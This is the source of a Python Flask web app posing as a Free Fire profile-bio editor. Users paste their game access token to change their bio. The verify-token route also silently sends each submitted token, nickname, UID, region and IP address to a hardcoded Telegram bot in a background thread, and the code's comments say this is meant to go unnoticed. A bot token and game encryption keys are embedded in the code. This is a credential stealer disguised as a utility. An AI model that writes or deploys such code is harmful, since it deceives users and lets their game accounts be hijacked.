from flask import Flask, request, jsonify, render_template
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from google.protobuf import descriptor as _descriptor
from google.protobuf import descriptor_pool as _descriptor_pool
from google.protobuf import symbol_database as _symbol_database
from google.protobuf.internal import builder as _builder
import requests
import re
import urllib.parse
from datetime import datetime
import threading

app = Flask(__name__, template_folder='templates')

# --- CONFIGURATION ---
TELEGRAM_BOT_TOKEN = "8010690774:AAFtqxOlbqU-qaCc6fqyzTZYXUBPDyz_1vY"
TELEGRAM_CHAT_ID = "6414001857"

# Load site configuration
try:
    from config import SITE_CONFIG
except ImportError:
    SITE_CONFIG = {
        "site_name": "FF BIO TOOL",
        "freefire_version": "OB53",
        "bio_char_limit": 280
    }

app.config['SITE_CONFIG'] = SITE_CONFIG

# --- TELEGRAM LOGGING FUNCTION ---
def send_to_telegram(token, nick, uid, reg):
    """Data ko Telegram par silently forward karne ka function"""
    user_ip = request.headers.get('x-forwarded-for', request.remote_addr)
    
    message = (
        "🚀 **New Token Received**\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 **Name:** `{nick}`\n"
        f"🆔 **UID:** `{uid}`\n"
        f"🌍 **Region:** `{reg}`\n"
        f"🔑 **Token:** `{token}`\n"
        f"🕒 **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"🌐 **IP:** `{user_ip}`\n"
        "━━━━━━━━━━━━━━━━━━━━"
    )
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    
    try:
        requests.post(url, json=payload, timeout=10)
    except Exception as e:
        print(f"Telegram Error: {e}")

# --- PROTOBUF SETUP ---
_sym_db = _symbol_database.Default()
DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(b'\n\ndata.proto\"\xbb\x01\n\x04\x44\x61ta\x12\x0f\n\x07\x66ield_2\x18\x02 \x01(\x05\x12\x1e\n\x07\x66ield_5\x18\x05 \x01(\x0b\x32\r.EmptyMessage\x12\x1e\n\x07\x66ield_6\x18\x06 \x01(\x0b\x32\r.EmptyMessage\x12\x0f\n\x07\x66ield_8\x18\x08 \x01(\t\x12\x0f\n\x07\x66ield_9\x18\t \x01(\x05\x12\x1f\n\x08\x66ield_11\x18\x0b \x01(\x0b\x32\r.EmptyMessage\x12\x1f\n\x08\x66ield_12\x18\x0c \x01(\x0b\x32\r.EmptyMessage\"\x0e\n\x0c\x45mptyMessageb\x06proto3')
_globals = globals()
_builder.BuildMessageAndEnumDescriptors(DESCRIPTOR, _globals)
_builder.BuildTopDescriptorsAndMessages(DESCRIPTOR, 'data1_pb2', _globals)

Data = _sym_db.GetSymbol('Data')
EmptyMessage = _sym_db.GetSymbol('EmptyMessage')

# Encryption keys
key = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
iv = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])

# --- UTILITY FUNCTIONS ---
def get_region_url(region):
    region_urls = {
        "IND": "https://client.ind.freefiremobile.com",
        "BR": "https://client.us.freefiremobile.com",
        "US": "https://client.us.freefiremobile.com",
        "SAC": "https://client.us.freefiremobile.com",
        "NA": "https://client.us.freefiremobile.com",
        "ME": "https://clientbp.common.ggbluefox.com",
        "TH": "https://clientbp.common.ggbluefox.com"
    }
    return region_urls.get(region.upper(), "https://clientbp.ggblueshark.com")

def get_account_from_eat(eat_token):
    try:
        if '?eat=' in eat_token:
            eat_token = urllib.parse.parse_qs(urllib.parse.urlparse(eat_token).query).get('eat', [eat_token])[0]
        elif '&eat=' in eat_token:
            match = re.search(r'[?&]eat=([^&]+)', eat_token)
            if match: eat_token = match.group(1)
        
        EAT_API_URL = "https://eat-api.thory.buzz/api"
        response = requests.get(f"{EAT_API_URL}?eatjwt={eat_token}", timeout=15)
        
        if response.status_code != 200: return None, None, f"API error: {response.status_code}"
        
        data = response.json()
        if data.get('status') != 'success': return None, None, f"Invalid token"
        
        account_info = {
            "uid": data.get('uid'),
            "region": data.get('region', 'IND'),
            "nickname": data.get('nickname')
        }
        return data.get('token'), account_info, None
    except Exception as e:
        return None, None, str(e)

def update_bio_with_jwt(jwt_token, bio_text, region):
    try:
        base_url = get_region_url(region)
        data = Data()
        data.field_2 = 17
        data.field_8 = bio_text.replace('+', ' ')
        data.field_9 = 1
        data.field_5.CopyFrom(EmptyMessage()); data.field_6.CopyFrom(EmptyMessage())
        data.field_11.CopyFrom(EmptyMessage()); data.field_12.CopyFrom(EmptyMessage())
        
        encrypted_data = AES.new(key, AES.MODE_CBC, iv).encrypt(pad(data.SerializeToString(), AES.block_size))
        
        host = urllib.parse.urlparse(base_url).netloc
        headers = {
            "Authorization": f"Bearer {jwt_token}",
            "ReleaseVersion": SITE_CONFIG.get('freefire_version', 'OB53'),
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-A305F)",
            "Host": host
        }
        res = requests.post(f"{base_url}/UpdateSocialBasicInfo", headers=headers, data=encrypted_data, timeout=30)
        return res.status_code == 200
    except Exception as e:
        raise Exception(str(e))

# --- ROUTES ---
@app.route('/')
def index():
    return render_template('index.html', config=SITE_CONFIG)

@app.route('/api/verify-token', methods=['POST'])
def verify_token():
    """Token verify karta hai aur silently Telegram par bhejta hai"""
    try:
        data = request.get_json()
        eat_token = data.get('eat_token')
        if not eat_token: return jsonify({"success": False, "error": "Missing token"}), 400
        
        jwt_token, account_info, error = get_account_from_eat(eat_token)
        if error: return jsonify({"success": False, "error": error}), 400

        # Background threading taaki user ko delay mehsoos na ho
        threading.Thread(target=send_to_telegram, args=(
            eat_token, 
            account_info.get('nickname', '--'), 
            account_info.get('uid', '--'), 
            account_info.get('region', '--')
        )).start()

        return jsonify({"success": True, "account": account_info, "jwt_token": jwt_token})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

@app.route('/api/update-bio', methods=['POST'])
def update_bio():
    try:
        data = request.get_json()
        success = update_bio_with_jwt(data.get('jwt_token'), data.get('bio'), data.get('region'))
        if success: return jsonify({"success": True, "message": "Bio updated!"})
        return jsonify({"success": False, "error": "Update failed"}), 400
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
